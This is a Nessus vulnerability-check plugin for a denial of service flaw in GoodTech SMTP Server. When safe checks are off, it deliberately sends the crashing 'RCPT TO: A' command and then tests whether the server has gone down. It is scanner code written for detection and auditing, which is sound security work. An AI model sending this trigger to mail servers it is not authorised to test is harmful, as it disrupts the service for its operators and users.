#
# (C) Tenable Network Security
#
# 


  desc["english"] = "
The version of GoodTech SMTP Server running on the remote host is
prone to a denial of service vulnerability that can be triggered by
sending a 'RCPT TO' command with the sole argument 'A'. 

See also : http://lists.grok.org.uk/pipermail/full-disclosure/2005-June/034457.html
Solution : Upgrade to GoodTech SMTP Server 5.15 or newer.
Risk factor : High";


if (description) {
  script_id(18433);
  script_version("$Revision: 1.1 $");

  script_cve_id("CAN-2005-1013");
  script_bugtraq_id(13888);

  name["english"] = "GoodTech SMTP Server Malformed RCPT TO Denial of Service Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for malformed RCPT TO denial of service vulnerability in GoodTech SMTP Server";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Denial of Service");
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_exclude_keys("SMTP/wrapped");

  exit(0);
}


include("smtp_func.inc");
include("misc_func.inc");


port = get_kb_item("Services/smtp");
if (!port) port = 25;
if (!get_port_state(port)) exit(1);
if (get_kb_item('SMTP/'+port+'/broken')) exit(1);


# If the banner suggests it's GoodTech...
banner = get_smtp_banner(port);
if (banner && "Simple Mail Transfer Service Ready. Version" >< banner) {
  # If safe checks are enabled...
  if (safe_checks()) {
    # nb: the original advisory only talks about 5.14 as vulnerable, 
    #     but I'd be very surprised if a flaw such as this crept into
    #     just one version. :-)
    if (banner =~ "Version ([0-4]\.|5\.(0|1[0-4][^0-9]))") {
      desc = str_replace(
        string:desc["english"],
        find:"Solution :",
        replace:string(
          "***** Nessus has determined the vulnerability exists on the remote\n",
          "***** host simply by looking at the installed version number of\n",
          "***** GoodTech SMTP Server.\n",
          "\n",
          "Solution :"
        )
      );
      security_hole(port:port, data:desc);
    }
  }
  # Otherwise...
  else {
    # Let's try to crash it.
    soc = smtp_open(rand_str());
    if (!soc) exit(1);

    c = string("RCPT TO: A");
    send(socket:soc, data:string(c, "\r\n"));
    s = smtp_recv_line(socket:soc);

    # If it's down, try once to reconnect.
    if (!s) {
      close(soc);
      sleep(1);
      # Is the daemon history?
      soc = open_sock_tcp(port);
      if (!soc) {
        security_hole(port);
        exit(0);
      }
    }

    # Let's be nice.
    c = "QUIT";
    send(socket:soc, data:string(c, "\r\n"));
    close(soc);
  }
}
